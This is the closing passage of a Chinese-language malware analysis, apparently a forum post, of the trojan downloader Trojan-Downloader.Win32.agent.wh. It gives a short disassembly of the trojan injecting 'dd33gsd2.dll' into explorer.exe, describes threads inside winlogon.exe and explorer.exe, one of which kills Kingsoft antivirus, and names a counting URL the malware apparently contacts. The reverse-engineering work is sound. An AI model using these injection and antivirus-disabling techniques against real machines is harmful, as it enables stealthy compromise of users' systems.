mecount=0 url=http://nx.51ylb.cn/soft/count/count.asp |

  
开四个线程后,病毒开始远程注入  
100029F2  |.  68 046A0010   push    10006A04                 ; /Arg2 = 10006A04 ASCII "explorer.exe"  
100029F7  |.  68 04670010   push    10006704                 ; |Arg1 = 10006704 ASCII "dd33gsd2.dll"  
100029FC  |.  E8 38F7FFFF   call    10002139                 ; \\555E9A24.10002139  
不跟了,远程的方法和罗老大的<<Windows 环境下 32 位汇编语言程序设计>>里面讲的一样.  
  
  
上面四个线程和一个远程注入操作是在当前进程为 winlogon.exe 时运行的.(do A)  
  
还有两个线程是在当前进程为 explorer.exe 时运行的,一个和上面一个线程功能重复,另一个负责关闭金山毒霸.(do B)  
  
如果当前线程不是上面两个线程呢???  do C ???  实话告诉你,他们都睡觉去了,哈哈  
也就是  
while(1)  
{  
  sleep(XXXms);  
}  
  
  
  
好了分析完毕!!!!  
大功告成!!!  
睡觉去了

上传的附件
| ![](img/2674941de574f12fa6a3e90d2eb3468a.jpg) || Trojan-Downloader.Win32.agent.wh 分析.doc  
 |
|   
 |